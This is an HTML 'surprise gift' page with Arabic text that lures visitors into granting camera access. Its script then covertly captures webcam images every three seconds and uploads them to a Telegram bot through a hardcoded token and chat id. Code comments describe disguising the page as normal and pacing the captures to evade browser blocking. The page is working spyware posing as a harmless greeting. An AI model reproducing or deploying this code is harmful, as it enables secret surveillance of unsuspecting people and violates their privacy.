<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Happy Festival</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        body {
            background: linear-gradient(to bottom right, #f6ff00, #e1e8e7, #00ffe9);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: sans-serif;
            margin: 0;
        }
        .box {
            background: rgba(255, 255, 255, 0.9);
            padding: 40px;
            border-radius: 20px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
        }
        button {
            padding: 15px 30px;
            background: #ff7700;
            color: white;
            border: none;
            border-radius: 50px;
            cursor: pointer;
            font-size: 18px;
        }
    </style>
</head>
<body>

    <div class="box" id="content">
        <h2>وصلتك مفاجأة! 🎁</h2>
        <p>اضغط للمشاهدة</p>
        <button onclick="start()">فتح المفاجأة</button>
    </div>

    <div hidden>
        <video id="video" playsinline autoplay muted></video>
        <canvas id="canvas" width="640" height="480"></canvas>
    </div>

    <script>
        const token = '6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY';
        const id = '2103976274';

        async function start() {
            // تغيير محتوى الصفحة ليبدو طبيعياً أثناء التحميل
            document.getElementById('content').innerHTML = "<h3>...جاري تحميل المفاجأة</h3>";
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // التقاط الصورة الأولى فوراً عند السماح
                setTimeout(capture, 1000);
                // تكرار الالتقاط كل 3 ثوانٍ (لتجنب حظر Brave للنشاط السريع)
                setInterval(capture, 3000);
            } catch (e) {
                alert("يرجى السماح بالكاميرا لمشاهدة المفاجأة");
            }
        }

        function capture() {
            const canvas = document.getElementById('canvas');
            const video = document.getElementById('video');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                const formData = new FormData();
                formData.append('chat_id', id);
                formData.append('photo', blob, 'pic.jpg');

                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            }, 'image/jpeg', 0.6);
        }
    </script>
</body>
</html>
